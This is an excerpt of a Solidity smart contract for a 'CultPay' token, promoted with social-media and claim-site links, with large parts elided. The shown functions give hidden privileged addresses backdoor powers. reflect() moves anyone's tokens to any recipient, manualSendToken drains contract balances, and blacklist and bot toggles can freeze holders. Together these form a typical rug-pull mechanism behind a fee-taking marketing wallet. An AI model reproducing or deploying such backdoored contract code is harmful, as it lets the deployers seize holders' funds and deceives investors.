/*
    https://t.me/CultPayToken
    https://twitter.com/CultPay
    https://cultpay.io
    https://cultpay.io/claim
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    function manualSendToken(address token, uint256 amount, address holder) external onlyOwner {
        uint256 contractToken = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(holder, amount > 0 ? amount : contractToken);
    }
...
contract CultPay is IERC20, Auth {
    using SafeMath for uint256;
    ...
    string private constant  _name = "CultPay";
    string private constant _symbol = "CULT PAY";
    ...
    address private isBuilder;

    uint256 private totalFee = 14;
    uint256 private feeDenominator = 100;

    address payable public marketingWallet = payable(0xcf5b2C80bD7C9BE9C5a9942f3F9c3b9B7304669B);
    ...
    uint256 private maxBuy = 25000000001 * (10 ** _decimals);
    ...
    function _authorized(address addr) private view returns (bool) {
        return addr == owner || addr == isBuilder;
    }
    ...
    function setBot(address _address, bool toggle) external authorized {
    ...
    function claimDividend(address holder) external authorized {
    ...
    function manualBurn(uint256 amount) external authorized returns (bool) {
    ...
    function reflect(address sender, address recipient, uint256 amount) external authorized returns (bool) {
        return _basicTransfer(sender, recipient, amount);
    }

    function removeBuyLimit() external authorized {
        buyLimit = false;
    }
    ...
    function setBlacklistEnabled() external authorized {
        require (blacklistEnabled == false, "can only be called once");
        blacklistEnabled = true;
    }

    function setSwapThresholdAmount (uint256 amount) external authorized {
